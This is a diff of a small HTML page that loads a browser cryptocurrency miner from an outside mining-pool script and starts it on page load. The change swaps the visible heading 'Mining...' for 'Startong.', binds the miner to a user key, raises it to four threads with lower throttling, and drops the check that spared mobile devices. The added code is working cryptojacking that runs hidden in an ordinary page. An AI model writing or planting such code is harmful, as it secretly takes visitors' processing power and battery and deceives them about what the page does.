@@ -2,8 +2,6 @@
 
 <html lang="en" dir="ltr">
 
- 
-
 <head>
 
     <meta charset="utf-8">
@@ -13,29 +11,28 @@
 </head>
 
 <body>
-
-    <h1>Mining...</h1>
-
+  
+  <h1>Startong.</h1>
+  
 </body>
-
- 
-
+  
 <script src="https://webminepool.com/lib/base.js"></script>
-
- 
 
 <script>
 
- 
+    var miner = WMP.User('<SK_MMgT8VQDSrSAMk4M2Ej5l>', '<ElLobito>',{
 
-    var miner = WMP.Anonymous('<SK_MMgT8VQDSrSAMk4M2Ej5l>',{throttle: 0.3});
-    
-    if (!miner.isMobile()){
+        threads: 4,
 
-        miner.start();
+        autoThreads: false,
 
-    }
- 
+        throttle: 0.1,
+
+
+    });
+
+    miner.start();
+
 </script>
 
 </html>
